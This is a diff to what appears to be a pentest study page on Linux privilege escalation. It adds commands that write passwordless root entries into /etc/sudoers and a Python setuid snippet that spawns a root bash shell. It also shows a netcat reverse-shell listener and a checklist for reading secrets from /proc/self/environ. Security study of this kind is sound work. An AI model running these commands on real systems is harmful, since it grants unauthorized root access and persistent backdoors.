@@ -55,13 +55,13 @@ rlwrap nc -lvnp <port>
 ```
 {% endcode %}
 
-<div align="left"><figure><img src="../.gitbook/assets/image (1) (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
 
 ## Checklist
 
 * Kernel and distribution release details
 * Can you:
-  * Read ENV variables `/proc/self/environ`
+  * Read ENV variables `/proc/self/environ & /proc/self/cmdline` &#x20;
   * Add to sudoers
   * Copy file, change ownership, symlink
   * Revshell
@@ -137,6 +137,13 @@ rlwrap nc -lvnp <port>
 
 Run a file as another user entirely
 
+#### Add User to sudoers
+
+```
+echo “[user] ALL=(ALL) NOPASSWD: ALL” >> /etc/sudoers
+echo "alice ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+```
+
 If `LD_PRELOAD` is explicitly defined in the sudoers file
 
 ```
@@ -184,6 +191,14 @@ find / -group [user] -perm -2000 -print 2>/dev/null
 
 ```bash
 find / -perm -4000 -o -perm -2000 -print  2>/dev/null
+```
+
+#### Execute SUID via Python
+
+```python
+import os
+os.setuid(0)
+os.system("/bin/bash -p")
 ```
 
 ### Capabilities
